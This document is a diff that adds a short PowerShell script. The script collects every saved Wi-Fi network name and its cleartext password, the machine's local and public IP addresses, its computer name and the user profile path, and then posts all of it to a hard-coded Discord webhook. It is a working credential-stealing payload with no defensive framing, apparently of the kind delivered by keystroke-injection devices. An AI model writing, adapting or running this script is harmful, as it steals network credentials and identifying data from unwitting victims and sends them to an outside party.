@@ -1,0 +1,14 @@
+$Wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
+$dhcp1 = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-String
+$public =Invoke-RestMethod http://ipinfo.io/json | Select -exp ip | Out-String
+$webhookUri = 'https://discord.com/api/webhooks/1073226839788638272/T9nsW3EDHNuopSPICWPgw8v60owoOgkRA2XjBIcbqUiFhQe3TpqtxqDBo0gTm5-AtS3A'
+$Body1 = @{ 'username' = $env:USERPROFILE ; 'content' = $public}
+$Body2 = @{ 'username' = $env:USERPROFILE ; 'content' = $dhcp1}
+$Body3 = @{ 'username' = $env:USERPROFILE ; 'content' = $env:computername}
+$Body4 = @{ 'username' = $env:USERPROFILE ; 'content' = $env:USERPROFILE}
+$Body5 = @{ 'username' = $env:USERPROFILE ; 'content' = $Wifi}
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body1
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body2
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body3
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body4
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body5 ;exit
